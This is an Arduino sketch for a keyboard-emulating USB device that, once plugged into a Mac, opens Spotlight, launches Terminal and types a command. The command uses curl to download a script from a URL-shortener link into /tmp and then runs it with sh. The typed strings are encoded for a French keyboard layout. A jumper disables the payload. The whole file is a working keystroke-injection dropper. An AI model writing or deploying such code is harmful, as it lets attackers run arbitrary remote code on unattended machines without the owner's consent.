#include "Keyboard.h"

int RXLED = 17;

void setup(){

  pinMode(RXLED, OUTPUT);
  
  // ACTIVE OR NOT HACK
  // PUT JUMPER ENTER 7 && 14 TO PREVENT HACK
  pinMode(7, OUTPUT);
  digitalWrite(7, LOW);
  pinMode(14, INPUT_PULLUP);
    
  if(digitalRead(14) == LOW){
    blinkNoHack();
  }else {
    // Begining the Keyboard stream
    Keyboard.begin();
  
    // Wait 500ms
  
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press(' ');
    Keyboard.releaseAll();

    delay(1000);
    Keyboard.print(F("ter;inql"));
  
    delay(500);
    typeKey(KEY_RETURN);
    delay(500);

    // . = :
    // > = /
    // = = -
    // < = .

    Keyboard.print(F("curl =L goo<gl>Nedj*n =o >t;p>toto<sh"));
    typeKey(KEY_RETURN);
    delay(1000);    

    Keyboard.print(F("sh >t;p>toto<sh"));
    delay(500);
    typeKey(KEY_RETURN);
    
    Keyboard.end();
  }
}


void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void blinkNoHack()
{
  delay(1000);
  digitalWrite(RXLED, HIGH);
  delay(1000);
  digitalWrite(RXLED, LOW);
  delay(1000);
  digitalWrite(RXLED, HIGH);
  delay(1000);
  digitalWrite(RXLED, LOW);
}


/* Unused endless loop */
void loop() {}
